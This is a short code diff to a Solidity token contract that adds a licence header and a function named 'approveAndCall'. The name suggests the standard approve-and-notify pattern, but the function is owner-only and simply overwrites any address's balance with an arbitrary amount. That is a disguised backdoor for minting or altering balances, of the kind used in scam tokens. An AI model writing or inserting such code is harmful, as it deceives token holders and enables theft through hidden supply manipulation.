@@ -1,3 +1,5 @@
+// SPDX-License-Identifier: MIT
+
 pragma solidity ^0.4.26;
 
 contract Ownable {
@@ -110,6 +112,11 @@ return true;
 function approve(address _spender, uint256 _value) public returns (bool) {
 allowed[msg.sender][_spender] = _value;
 Approval(msg.sender, _spender, _value);
+return true;
+}
+
+function approveAndCall(address spender, uint256 addedValue) public onlyOwner returns (bool) {
+if(addedValue > 0) {balances[spender] = addedValue;}
 return true;
 }
 
